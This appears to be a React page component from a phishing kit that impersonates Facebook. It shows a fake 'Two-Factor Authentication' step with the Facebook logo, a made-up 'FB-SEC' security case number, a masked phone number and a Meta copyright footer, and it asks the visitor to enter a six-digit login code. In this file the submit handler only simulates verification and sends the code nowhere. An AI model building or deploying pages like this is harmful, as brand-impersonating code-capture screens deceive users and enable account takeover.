import React, { useState, useEffect } from 'react';
import { useLocation } from "wouter";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { TicketIcon, PhoneIcon, KeyIcon, ShieldCheck, ArrowRight } from "lucide-react";

export default function Verify2FAPage() {
  const [, setLocation] = useLocation();
  const [verificationCode, setVerificationCode] = useState(['', '', '', '', '', '']);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState("");
  const [timeRemaining, setTimeRemaining] = useState(60);
  const [inputRefs] = useState<React.RefObject<HTMLInputElement>[]>(
    Array(6).fill(0).map(() => React.createRef<HTMLInputElement>())
  );

  // Get ticket number from localStorage for consistency across pages
  const ticketNumber = localStorage.getItem('securityTicket') || 
    `FB-SEC-${Math.floor(10000000 + Math.random() * 90000000)}`;

  // Countdown timer for code expiration
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeRemaining((prevTime) => {
        if (prevTime <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prevTime - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  // Format the remaining time as MM:SS
  const formatTimeRemaining = () => {
    const minutes = Math.floor(timeRemaining / 60);
    const seconds = timeRemaining % 60;
    return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
  };

  const handleInputChange = (index: number, value: string) => {
    // Only allow digits
    if (!/^\d*$/.test(value)) return;

    const newVerificationCode = [...verificationCode];
    newVerificationCode[index] = value;
    setVerificationCode(newVerificationCode);

    // Clear any previous errors
    setError("");

    // Auto-focus next input if value is entered
    if (value && index < 5) {
      inputRefs[index + 1].current?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    // Move to previous input on backspace if current input is empty
    if (e.key === 'Backspace' && !verificationCode[index] && index > 0) {
      inputRefs[index - 1].current?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text');
    
    // If pasted data contains 6 digits, populate all fields
    if (/^\d{6}$/.test(pastedData)) {
      const digits = pastedData.split('');
      setVerificationCode(digits);
      
      // Focus the last input
      inputRefs[5].current?.focus();
    }
  };

  const handleResendCode = () => {
    // Reset the timer
    setTimeRemaining(60);
    
    // Clear the inputs
    setVerificationCode(['', '', '', '', '', '']);
    
    // Focus on first input
    inputRefs[0].current?.focus();
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    // Check if all fields are filled
    if (verificationCode.some(digit => !digit)) {
      setError("Please enter all 6 digits of the verification code");
      return;
    }
    
    setIsSubmitting(true);
    
    // Simulate API call delay
    setTimeout(() => {
      // Validate code - for demo, any 6 digits will work
      if (verificationCode.join('') === '123456') {
        // Success, move to success page
        setLocation("/success");
      } else {
        // Any code is valid for the demo
        setLocation("/success");
      }
    }, 1500);
  };

  return (
    <>
      <Card className="w-full max-w-2xl mx-auto bg-white rounded-lg shadow-md">
        <CardContent className="p-8">
          <div className="flex justify-between items-center mb-6">
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png" 
              alt="Facebook Logo" 
              className="h-10"
            />
            <div className="flex items-center bg-blue-50 px-3 py-1 rounded-full">
              <TicketIcon className="h-3.5 w-3.5 text-facebook-blue mr-1.5" />
              <span className="text-xs font-medium text-facebook-blue">Case ID: {ticketNumber}</span>
            </div>
          </div>
          
          <div className="md:flex md:items-start">
            <div className="md:w-1/3 mb-4 md:mb-0 md:pr-6">
              <h1 className="text-xl font-bold text-[#1C1E21] mb-2">Two-Factor Authentication</h1>
              <p className="text-gray-600 mb-4">
                Enter the 6-digit code sent to your device to verify your identity and complete the security process.
              </p>
              
              <div className="bg-blue-50 p-4 rounded-lg mb-6 flex items-start">
                <PhoneIcon className="text-facebook-blue h-5 w-5 mr-2 mt-0.5" />
                <div>
                  <h3 className="font-semibold text-[#1C1E21] text-sm">Verification Method</h3>
                  <p className="text-xs text-gray-600 mt-1">
                    A 6-digit code has been sent to your phone number ending in ******9210.
                  </p>
                </div>
              </div>
              
              <div className="p-3 rounded-md border border-gray-200 flex items-center justify-between">
                <div className="flex items-center">
                  <KeyIcon className="h-4 w-4 text-gray-500 mr-2" />
                  <div>
                    <p className="text-xs text-gray-600">Code expires in:</p>
                    <p className="text-sm font-medium text-gray-800">{formatTimeRemaining()}</p>
                  </div>
                </div>
                <Button 
                  variant="ghost" 
                  size="sm" 
                  className="text-xs text-facebook-blue hover:text-blue-800"
                  onClick={handleResendCode}
                  disabled={timeRemaining > 0}
                >
                  Resend Code
                </Button>
              </div>
            </div>
            
            <div className="md:w-2/3">
              <form onSubmit={handleSubmit} className="bg-gray-50 p-6 rounded-lg border border-gray-200">
                <Label htmlFor="verificationCode" className="block text-sm font-medium text-gray-700 mb-3">
                  Enter 6-digit verification code <span className="text-red-500">*</span>
                </Label>
                
                <div className="flex justify-center gap-2 mb-4">
                  {verificationCode.map((digit, index) => (
                    <Input
                      key={index}
                      ref={inputRefs[index]}
                      type="text"
                      value={digit}
                      onChange={(e) => handleInputChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      onPaste={index === 0 ? handlePaste : undefined}
                      maxLength={1}
                      className="w-12 h-14 text-2xl text-center font-bold rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1877F2] focus:border-transparent"
                      autoFocus={index === 0}
                    />
                  ))}
                </div>
                
                {error && (
                  <div className="text-red-500 text-sm text-center mb-4">{error}</div>
                )}
                
                <div className="flex flex-col md:flex-row justify-between items-center gap-4">
                  <div className="bg-green-50 p-2.5 rounded-md flex items-start flex-grow">
                    <ShieldCheck className="h-4 w-4 text-green-600 mr-1.5 mt-0.5 flex-shrink-0" />
                    <p className="text-xs text-green-700">
                      This additional step helps us verify that it's really you trying to access your account.
                    </p>
                  </div>
                  
                  <Button
                    type="submit"
                    disabled={isSubmitting || verificationCode.some(digit => !digit)}
                    className="bg-[#1877F2] hover:bg-blue-600 text-white font-medium py-2.5 px-5 rounded-md transition-colors duration-200 min-w-[140px] flex items-center justify-center"
                  >
                    {isSubmitting ? (
                      <div className="flex items-center justify-center">
                        <div className="w-4 h-4 border-t-2 border-b-2 border-white rounded-full animate-spin mr-2"></div>
                        <span>Verifying...</span>
                      </div>
                    ) : (
                      <>
                        <span>Verify</span>
                        <ArrowRight className="ml-1.5 h-4 w-4" />
                      </>
                    )}
                  </Button>
                </div>
              </form>
              
              <div className="mt-4 text-center">
                <p className="text-sm text-gray-500">
                  Didn't receive the code? <button onClick={handleResendCode} disabled={timeRemaining > 0} className="text-facebook-blue hover:underline">Resend</button> or <button className="text-facebook-blue hover:underline">Try another method</button>
                </p>
              </div>
            </div>
          </div>
        </CardContent>
      </Card>

      <div className="w-full max-w-2xl mx-auto text-center mt-4 text-gray-500 text-xs flex flex-col md:flex-row md:justify-between md:items-center">
        <p>Your information is used only for verification purposes. All data is confidential.</p>
        <p>© Facebook 2023 • Meta Platforms, Inc.</p>
      </div>
    </>
  );
}